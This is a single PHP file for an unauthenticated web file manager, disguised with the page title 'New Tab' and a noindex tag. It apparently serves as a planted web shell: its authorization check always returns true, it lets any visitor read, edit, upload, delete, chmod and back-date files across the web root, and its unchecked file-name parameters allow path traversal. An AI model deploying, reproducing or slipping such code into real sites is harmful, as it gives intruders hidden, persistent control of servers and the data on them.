<?php session_start(); $config = ['root_path' => realpath($_SERVER['DOCUMENT_ROOT']), 'max_upload_size' => 100 * 1024 * 1024, 'allowed_extensions' => ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'txt', 'zip', 'rar', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx'], 'timezone' => 'UTC']; date_default_timezone_set($config['timezone']); function is_authorized() { return true; } if (!is_authorized()) { die("Unauthorized access"); } function get_file_icon($file) { $extension = strtolower(pathinfo($file, PATHINFO_EXTENSION)); $icon_map = ['pdf' => '📄', 'txt' => '📝', 'doc' => '📘', 'docx' => '📘', 'xls' => '📊', 'xlsx' => '📊', 'ppt' => '📽', 'pptx' => '📽', 'jpg' => '🖼', 'jpeg' => '🖼', 'png' => '🖼', 'gif' => '🖼', 'zip' => '🗜', 'rar' => '🗜']; return isset($icon_map[$extension]) ? $icon_map[$extension] : '📄'; } function human_filesize($bytes, $decimals = 2) { $size = array('B','KB','MB','GB','TB','PB','EB','ZB','YB'); $factor = floor((strlen($bytes) - 1) / 3); return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . ' ' . @$size[$factor]; } function secure_path($path) { global $config; $real_path = realpath($path); return ($real_path === false || strpos($real_path, $config['root_path']) !== 0) ? $config['root_path'] : $real_path; } function rrmdir($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "." && $object != "..") { $path = $dir . DIRECTORY_SEPARATOR . $object; if (is_dir($path)) { rrmdir($path); } else { unlink($path); } } } rmdir($dir); } } function handle_upload() { global $config, $current_dir; if (isset($_FILES['file'])) { $file = $_FILES['file']; if ($file['error'] == 0) { $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if (in_array($ext, $config['allowed_extensions']) && $file['size'] <= $config['max_upload_size']) { $destination = $current_dir . DIRECTORY_SEPARATOR . $file['name']; if (move_uploaded_file($file['tmp_name'], $destination)) { return "File uploaded successfully."; } } } } return "Upload failed."; } function handle_delete() { global $current_dir; $path = $current_dir . DIRECTORY_SEPARATOR . $_POST['source']; if (is_dir($path)) { rrmdir($path); return "Directory deleted successfully."; } elseif (is_file($path)) { unlink($path); return "File deleted successfully."; } return "Deletion failed."; } function handle_rename() { global $current_dir; $old = $current_dir . DIRECTORY_SEPARATOR . $_POST['oldname']; $new = $current_dir . DIRECTORY_SEPARATOR . $_POST['newname']; if (rename($old, $new)) { return "Renamed successfully."; } return "Rename failed."; } function handle_create_dir() { global $current_dir; $new_dir = $current_dir . DIRECTORY_SEPARATOR . $_POST['dirname']; if (!file_exists($new_dir) && mkdir($new_dir, 0755, true)) { chmod($new_dir, 0755); return "Directory created successfully."; } return "Failed to create directory."; } function handle_create_file() { global $current_dir; $new_file = $current_dir . DIRECTORY_SEPARATOR . $_POST['filename']; if (!file_exists($new_file) && file_put_contents($new_file, '') !== false) { return "File created successfully."; } return "Failed to create file."; } function handle_edit_file() { global $current_dir; $file = $current_dir . DIRECTORY_SEPARATOR . $_POST['filename']; $content = isset($_POST['content']) ? $_POST['content'] : ''; if (file_exists($file) && is_writable($file)) { if (file_put_contents($file, $content) !== false) { echo json_encode(['success' => true, 'message' => "File edited successfully."]); } else { echo json_encode(['success' => false, 'message' => "Failed to write to file."]); } } else { echo json_encode(['success' => false, 'message' => "File not found or not writable: " . $file]); } exit; } function handle_compress() { global $current_dir; $source = $current_dir . DIRECTORY_SEPARATOR . $_POST['source']; $zip_name = $source . '.zip'; if (is_dir($source)) { $zip = new ZipArchive(); if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::LEAVES_ONLY); foreach ($files as $name => $file) { if (!$file->isDir()) { $filePath = $file->getRealPath(); $relativePath = substr($filePath, strlen($source) + 1); $zip->addFile($filePath, $relativePath); } } $zip->close(); return "Directory compressed successfully."; } } elseif (is_file($source)) { $zip = new ZipArchive(); if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) { $zip->addFile($source, basename($source)); $zip->close(); return "File compressed successfully."; } } return "Compression failed."; } function handle_unzip() { global $current_dir; $zip_file = $current_dir . DIRECTORY_SEPARATOR . $_POST['zipfile']; $extract_to = $current_dir . DIRECTORY_SEPARATOR . pathinfo($_POST['zipfile'], PATHINFO_FILENAME); if (!file_exists($zip_file)) { return "Zip file not found."; } $zip = new ZipArchive; if ($zip->open($zip_file) === TRUE) { if (!file_exists($extract_to)) { mkdir($extract_to, 0755, true); } $zip->extractTo($extract_to); $zip->close(); return "Files extracted successfully to " . basename($extract_to); } else { return "Failed to extract files."; } } function handle_download() { global $current_dir; $file = $current_dir . DIRECTORY_SEPARATOR . $_GET['file']; if (file_exists($file)) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="'.basename($file).'"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); readfile($file); exit; } return "Download failed."; } function handle_copy() { global $current_dir; $_SESSION['clipboard'] = ['action' => 'copy', 'path' => $current_dir . DIRECTORY_SEPARATOR . $_POST['source']]; return "File/folder copied to clipboard. Use paste to complete the operation."; } function handle_move() { global $current_dir; $_SESSION['clipboard'] = ['action' => 'move', 'path' => $current_dir . DIRECTORY_SEPARATOR . $_POST['source']]; return "File/folder moved to clipboard. Use paste to complete the operation."; } function handle_paste() { global $current_dir, $config; if (!isset($_SESSION['clipboard'])) { return "Nothing to paste."; } $source = $_SESSION['clipboard']['path']; $destination = $current_dir . DIRECTORY_SEPARATOR . basename($source); if ($_SESSION['clipboard']['action'] === 'copy') { if (is_dir($source)) { recurse_copy($source, $destination); } else { copy($source, $destination); } } elseif ($_SESSION['clipboard']['action'] === 'move') { rename($source, $destination); } unset($_SESSION['clipboard']); return "Paste operation completed successfully."; } function handle_change_permissions() { global $current_dir; $file = $current_dir . DIRECTORY_SEPARATOR . $_POST['source']; $mode = octdec($_POST['mode']); if (chmod($file, $mode)) { echo json_encode(['success' => true, 'message' => "Permissions changed successfully."]); } else { echo json_encode(['success' => false, 'message' => "Failed to change permissions."]); } exit; } function handle_change_date() { global $current_dir; $file = $current_dir . DIRECTORY_SEPARATOR . $_POST['source']; $new_date = strtotime($_POST['new_date']); if (touch($file, $new_date)) { echo json_encode(['success' => true, 'message' => "Date modified successfully."]); } else { echo json_encode(['success' => false, 'message' => "Failed to change date."]); } exit; } function recurse_copy($src, $dst) { $dir = opendir($src); @mkdir($dst); while(false !== ($file = readdir($dir))) { if (($file != '.') && ($file != '..')) { if (is_dir($src . DIRECTORY_SEPARATOR . $file)) { recurse_copy($src . DIRECTORY_SEPARATOR . $file, $dst . DIRECTORY_SEPARATOR . $file); } else { copy($src . DIRECTORY_SEPARATOR . $file, $dst . DIRECTORY_SEPARATOR . $file); } } } closedir($dir); } function get_direct_url($item) { global $config, $current_dir; $relative_path = str_replace($config['root_path'], '', $current_dir . DIRECTORY_SEPARATOR . $item); return 'https://' . $_SERVER['HTTP_HOST'] . str_replace('\\', '/', $relative_path); } $current_dir = isset($_GET['dir']) ? secure_path($config['root_path'] . DIRECTORY_SEPARATOR . $_GET['dir']) : $config['root_path']; $message = ''; if ($_SERVER['REQUEST_METHOD'] === 'POST') { if (isset($_POST['upload'])) { $message = handle_upload(); } elseif (isset($_POST['delete'])) { $message = handle_delete(); } elseif (isset($_POST['rename'])) { $message = handle_rename(); } elseif (isset($_POST['create_dir'])) { $message = handle_create_dir(); } elseif (isset($_POST['create_file'])) { $message = handle_create_file(); } elseif (isset($_POST['edit_file'])) { handle_edit_file(); exit; } elseif (isset($_POST['compress'])) { $message = handle_compress(); } elseif (isset($_POST['unzip'])) { $message = handle_unzip(); } elseif (isset($_POST['copy'])) { $message = handle_copy(); } elseif (isset($_POST['move'])) { $message = handle_move(); } elseif (isset($_POST['paste'])) { $message = handle_paste(); } elseif (isset($_POST['change_permissions'])) { handle_change_permissions(); } elseif (isset($_POST['change_date'])) { handle_change_date(); } } elseif ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action'])) { if ($_GET['action'] === 'download') { handle_download(); } } $contents = scandir($current_dir); if (isset($_GET['action'])) { header('Content-Type: application/json'); switch ($_GET['action']) { case 'get_file_content': $dir = isset($_GET['dir']) ? secure_path($config['root_path'] . DIRECTORY_SEPARATOR . $_GET['dir']) : $config['root_path']; $file = $dir . DIRECTORY_SEPARATOR . $_GET['file']; if (file_exists($file) && is_file($file) && is_readable($file)) { $content = file_get_contents($file); if ($content !== false) { echo json_encode(['content' => $content]); } else { echo json_encode(['error' => 'Failed to read file content']); } } else { echo json_encode(['error' => 'File not found or not readable: ' . $file]); } exit; case 'save_file_content': $file = $current_dir . DIRECTORY_SEPARATOR . $_POST['filename']; if (file_put_contents($file, $_POST['content']) !== false) { echo json_encode(['message' => 'File saved successfully']); } else { echo json_encode(['error' => 'Failed to save file']); } exit; } } $server_name = $_SERVER['SERVER_NAME']; $server_software = $_SERVER['SERVER_SOFTWARE']; $current_url = "http://$server_name" . $_SERVER['REQUEST_URI']; ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>New Tab</title>
	<meta name="robots" content="noindex, nofollow">
    <style>
        body { font-family: Arial, sans-serif; }
        .file-manager { width: 80%; margin: 0 auto; }
        .file-manager h1 { text-align: center; }
        .file-list { list-style: none; padding: 0; }
        .file-list td { padding: 5px; border-bottom: 1px solid #ccc; }
        .file-actions form { display: inline; }
        .breadcrumb { margin-bottom: 20px; }
        .breadcrumb a { text-decoration: none; color: #007bff; }
        .breadcrumb a:hover { text-decoration: underline; }
        .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.4); }
        .modal-content { background-color: #fefefe; margin: 5% auto; padding: 20px; border: 1px solid #888; width: 80%; }
        .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; }
        .close:hover, .close:focus { color: black; text-decoration: none; cursor: pointer; }
        #editContent { width: 100%; height: 400px; }
    </style>
</head>
<body>
    <div class="file-manager">
        <title>New Tab</title>
        <p>Server: <?php echo htmlspecialchars($server_software); ?></p>
        <p>Domain: <?php echo htmlspecialchars($server_name); ?></p>
        <p>Current Path: 
            <?php
            $path_parts = explode('/', trim($current_dir, '/'));
            $current_path = '';
            foreach ($path_parts as $part) {
                $current_path .= '/' . $part;
                echo '<a href="?dir=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>/';
            }
            ?>
        </p>
        <?php if ($message): ?>
            <p><?php echo htmlspecialchars($message); ?></p>
        <?php endif; ?>
        <div class="breadcrumb">
            <?php
            $path_parts = explode('/', trim(str_replace($config['root_path'], '', $current_dir), '/'));
            $current_path = '';
            echo '<a href="?dir=">Root</a> / ';
            foreach ($path_parts as $part) {
                if ($part) {
                    $current_path .= '/' . $part;
                    echo '<a href="?dir=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a> / ';
                }
            }
            ?>
        </div>
        <table class="file-list">
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Modified</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
            <?php foreach ($contents as $item): ?>
                <?php if ($item != '.' && $item != '..'): ?>
                    <?php
                    $full_path = $current_dir . DIRECTORY_SEPARATOR . $item;
                    $is_dir = is_dir($full_path);
                    $size = $is_dir ? '-' : human_filesize(filesize($full_path));
                    $modified = date("Y-m-d H:i:s", filemtime($full_path));
                    $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                    ?>
                    <tr>
                        <td>
                            <?php echo get_file_icon($item); ?>
                            <?php if ($is_dir): ?>
                                <a href="?dir=<?php echo urlencode(str_replace($config['root_path'], '', $full_path)); ?>">
                                    <?php echo htmlspecialchars($item); ?>
                                </a>
                            <?php else: ?>
                                <?php echo htmlspecialchars($item); ?>
                            <?php endif; ?>
                        </td>
                        <td><?php echo $size; ?></td>
                        <td><span onclick="changeDate('<?php echo htmlspecialchars($item); ?>', '<?php echo $modified; ?>')"><?php echo $modified; ?></span></td>
                        <td onclick="changePermissions('<?php echo htmlspecialchars($item); ?>', '<?php echo $perms; ?>')"><?php echo $perms; ?></td>
                        <td class="file-actions">
                            <form method="post">
                                <input type="hidden" name="source" value="<?php echo htmlspecialchars($item); ?>">
                                <button type="submit" name="delete">Delete</button>
                                <button type="submit" name="copy">Copy</button>
                                <button type="submit" name="move">Move</button>
                                <button type="submit" name="compress">Compress</button>
                            </form>
                            <a href="?action=download&file=<?php echo urlencode($item); ?>">Download</a>
                            <?php if (!$is_dir): ?>
                                <button onclick="editFile('<?php echo htmlspecialchars(addslashes($item)); ?>')">Edit</button>
                            <?php endif; ?>
                            <a href="<?php echo get_direct_url($item); ?>" target="_blank" title="Open direct link">🔗</a>
                            <?php if (pathinfo($item, PATHINFO_EXTENSION) === 'zip'): ?>
                                <form method="post" style="display:inline;">
                                    <input type="hidden" name="zipfile" value="<?php echo htmlspecialchars($item); ?>">
                                    <button type="submit" name="unzip">Unzip</button>
                                </form>
                            <?php endif; ?>
                            <?php if ($is_dir): ?>
                                <form method="post" style="display:inline;">
                                    <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($item); ?>">
                                    <input type="text" name="newname" placeholder="New folder name">
                                    <button type="submit" name="rename_folder">Rename Folder</button>
                                </form>
                            <?php else: ?>
                                <form method="post" style="display:inline;">
                                    <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($item); ?>">
                                    <input type="text" name="newname" placeholder="New file name">
                                    <button type="submit" name="rename">Rename</button>
                                </form>
                            <?php endif; ?>
                        </td>
                    </tr>
                <?php endif; ?>
            <?php endforeach; ?>
        </table>
        <form method="post">
            <button type="submit" name="paste">Paste</button>
        </form>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>
        <form method="post">
            <input type="text" name="dirname" placeholder="New directory name">
            <button type="submit" name="create_dir">Create Directory</button>
        </form>
        <form method="post">
            <input type="text" name="filename" placeholder="New file name">
            <button type="submit" name="create_file">Create File</button>
        </form>
    </div>
    <div id="editModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>Edit File</h2>
            <textarea id="editContent" rows="20" cols="80"></textarea>
            <button onclick="saveFile()">Save</button>
        </div>
    </div>
    <div id="permissionsModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>Change Permissions</h2>
            <input type="text" id="newPermissions" placeholder="Enter new permissions (e.g., 0644)">
            <button onclick="savePermissions()">Save</button>
        </div>
    </div>
    <div id="dateModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>Change Date Modified</h2>
            <input type="text" id="newDate" placeholder="Enter new date (e.g., 2023-12-16 15:51:58)">
            <button onclick="saveDate()">Save</button>
        </div>
    </div>
    <script>
    let currentEditingFile = '';
    let currentFile = '';
    let currentDateFile = '';

    function editFile(filename) {
        currentEditingFile = filename;
        fetch('?action=get_file_content&file=' + encodeURIComponent(filename) + '&dir=' + encodeURIComponent(getCurrentDir()))
            .then(response => response.json())
            .then(data => {
                if (data.content !== undefined) {
                    document.getElementById('editContent').value = data.content;
                    document.getElementById('editModal').style.display = 'block';
                } else if (data.error) {
                    alert(data.error);
                } else {
                    document.getElementById('editContent').value = '';
                    document.getElementById('editModal').style.display = 'block';
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred while fetching the file content.');
            });
    }

    function getCurrentDir() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('dir') || '';
    }

    function saveFile() {
        let content = document.getElementById('editContent').value;
        let formData = new FormData();
        formData.append('filename', currentEditingFile);
        formData.append('content', content);
        formData.append('edit_file', '1');
        formData.append('dir', getCurrentDir());
        
        fetch(window.location.href, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(result => {
            if (result.success) {
                alert(result.message);
                document.getElementById('editModal').style.display = 'none';
                location.reload();
            } else {
                alert("Error: " + result.message);
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred while saving the file.');
        });
    }

    function changePermissions(filename, currentPerms) {
        currentFile = filename;
        document.getElementById('newPermissions').value = currentPerms;
        document.getElementById('permissionsModal').style.display = 'block';
    }

    function savePermissions() {
        let newPerms = document.getElementById('newPermissions').value;
        let formData = new FormData();
        formData.append('source', currentFile);
        formData.append('mode', newPerms);
        formData.append('change_permissions', '1');
        formData.append('dir', getCurrentDir());

        fetch(window.location.href, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(result => {
            if (result.success) {
                alert(result.message);
                document.getElementById('permissionsModal').style.display = 'none';
                location.reload();
            } else {
                alert("Error: " + result.message);
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred while changing permissions.');
        });
    }

    function changeDate(filename, currentDate) {
        currentDateFile = filename;
        document.getElementById('newDate').value = currentDate;
        document.getElementById('dateModal').style.display = 'block';
    }

    function saveDate() {
        let newDate = document.getElementById('newDate').value;
        let formData = new FormData();
        formData.append('source', currentDateFile);
        formData.append('new_date', newDate);
        formData.append('change_date', '1');
        formData.append('dir', getCurrentDir());

        fetch(window.location.href, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(result => {
            if (result.success) {
                alert(result.message);
                document.getElementById('dateModal').style.display = 'none';
                location.reload();
            } else {
                alert("Error: " + result.message);
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred while changing the date.');
        });
    }

    // Close modal functionality
    document.querySelectorAll(".close").forEach(function(closeBtn) {
        closeBtn.onclick = function() {
            this.closest('.modal').style.display = "none";
        }
    });

    window.onclick = function(event) {
        if (event.target.classList.contains('modal')) {
            event.target.style.display = "none";
        }
    }
    </script>
</body>
</html>
